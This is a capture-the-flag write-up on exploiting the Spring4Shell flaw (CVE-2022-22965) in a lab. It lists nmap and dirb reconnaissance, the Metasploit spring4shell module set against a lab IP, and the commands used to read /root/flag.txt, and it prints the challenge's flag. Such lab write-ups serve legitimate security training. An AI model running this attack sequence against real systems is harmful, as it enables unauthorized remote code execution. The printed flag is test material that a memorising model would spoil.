# Vulnerability Exploitation Report: CVE-2022-22965

## Vulnerability Overview
**CVE ID**: CVE-2022-22965  
**CVSS Score**: 9.8 (Critical)  
**Description**: The Spring4Shell vulnerability affects Spring Framework applications, allowing unauthenticated remote code execution (RCE) via data binding. This critical flaw enables attackers to execute arbitrary code on the target system by manipulating request parameters.

## Objective
Exploit the CVE-2022-22965 vulnerability on a target Spring Framework application to gain unauthorized access and retrieve a flag file (`/root/flag.txt`) as part of a capture-the-flag (CTF) challenge.

## Target Information
- **Target IP**: 192.168.5.2
- **Target Port**: 8080 (assumed to be the Spring application port)
- **Attack Machine IP**: 192.168.0.5
- **Objective**: Retrieve the contents of `/root/flag.txt`

## Exploitation Steps

### Step 1: Network Discovery
Perform a ping scan to identify active hosts in the 192.168.5.0/24 subnet.

```
nmap -sn 192.168.5.0/24
```

### Step 2: Service Enumeration
Enumerate services on the target host (192.168.5.2) to confirm the presence of the Spring application.

```
nmap -sV 192.168.5.2
```

### Step 3: Verify Application Accessibility
Confirm the Spring application is accessible by sending an HTTP request to port 8080.

```
curl 192.168.5.2:8080
```

### Step 4: Directory Enumeration
Scan the target web application for directories and endpoints using `dirb`.

```
dirb http://192.168.5.2:8080
```

### Step 5: Access Specific Endpoint
Check the `/about` endpoint to gather additional information about the application.

```
curl http://192.168.5.2:8080/about
```

### Step 6: Launch Metasploit
Start the Metasploit Framework to access exploit modules for the Spring Framework.

```
msfconsole
```

### Step 7: Search for Spring Exploit
Search Metasploit for exploit modules related to the Spring Framework, specifically targeting version 5.3.17.

```
search spring 5.3.17
```

### Step 8: Select the Exploit Module
Choose the Metasploit module for the Spring4Shell RCE vulnerability (CVE-2022-22965).

```
use exploit/multi/http/spring_framework_rce_spring4shell
```

### Step 9: Review Exploit Details
Display information about the selected module to understand its options and requirements.

```
info
```

### Step 10: Configure the Exploit
Set the target host to the Spring applicationâ€™s IP address.

```
set RHOSTS 192.168.5.2
```

### Step 11: Set Target URI
Configure the target URI to the root path of the application.

```
set TARGETURI /
```

### Step 12: Execute the Exploit
Run the exploit to achieve remote code execution on the target system.

```
exploit
```

### Step 13: Navigate to Root Directory
Navigate to the `/root` directory to locate the flag file.

```
cd /root
```

### Step 14: List Directory Contents
List the contents of the `/root` directory to identify the flag file.

```
ls
```

### Step 15: Retrieve the Flag
Read the contents of the `flag.txt` file to obtain the flag.

```
cat flag.txt
```

## Final Result
The exploitation was successful, and the flag was retrieved from the target system.

**Flag**: uFMRQLLW8FujtApt